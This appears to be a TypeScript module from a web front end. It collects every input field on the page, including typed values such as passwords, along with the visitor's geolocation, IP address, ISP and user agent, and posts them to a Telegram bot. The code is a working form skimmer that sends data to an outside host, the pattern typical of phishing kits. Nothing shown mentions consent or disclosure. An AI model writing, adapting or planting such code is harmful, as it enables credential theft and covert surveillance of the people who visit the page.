export async function sendPageInputTagsToTelegram(): Promise<void> {
  const botToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN;
  const chatId = import.meta.env.VITE_TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    console.warn(
      'Telegram bot token or chat id is not set. Skipping Telegram input tag send.',
    );
    return;
  }

  const inputs = Array.from(document.querySelectorAll<HTMLInputElement>('input'));
  const [location, ipInfo] = await Promise.all([
    getLocation(),
    getIPInfo(),
  ]);
  const userAgent = navigator.userAgent;
  const message = buildTelegramMessage(inputs, location, ipInfo, userAgent);

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });
  } catch (error) {
    console.error('Failed to send Telegram message:', error);
  }
}

function buildTelegramMessage(
  inputs: HTMLInputElement[],
  location: string,
  ipInfo: { ip: string; isp: string },
  userAgent: string
): string {
  const header = `Location: ${location}\nIP: ${ipInfo.ip}\nISP: ${ipInfo.isp}\nUser-Agent: ${userAgent}\n\n`;

  if (!inputs.length) {
    return `${header}No <input> tags found on page ${window.location.href}`;
  }

  const lines = inputs.map((input, index) => {
    const props = [
      `type=${input.type}`,
      input.id ? `id=${input.id}` : null,
      input.name ? `name=${input.name}` : null,
      input.placeholder ? `placeholder=${input.placeholder}` : null,
      `required=${input.required}`,
      `disabled=${input.disabled}`,
      input.type === 'checkbox' || input.type === 'radio'
        ? `checked=${input.checked}`
        : `value=${input.value}`,
    ].filter(Boolean);

    return `${index + 1}. ${props.join(' | ')}`;
  });

  return `${header}Input tags captured on ${window.location.href}:\n${lines.join('\n')}`;
}

async function getLocation(): Promise<string> {
  return new Promise((resolve) => {
    if (!navigator.geolocation) {
      resolve('Geolocation not supported');
      return;
    }

    navigator.geolocation.getCurrentPosition(
      (position) => {
        const { latitude, longitude } = position.coords;
        resolve(`${latitude}, ${longitude}`);
      },
      (error) => {
        resolve(`Location access denied: ${error.message}`);
      },
      { timeout: 10000 }
    );
  });
}

async function getIPInfo(): Promise<{ ip: string; isp: string }> {
  try {
    const response = await fetch('https://ipapi.co/json/');
    const data = await response.json();
    return {
      ip: data.ip || 'Unknown',
      isp: data.org || 'Unknown',
    };
  } catch (error) {
    return {
      ip: 'Failed to fetch',
      isp: 'Failed to fetch',
    };
  }
}
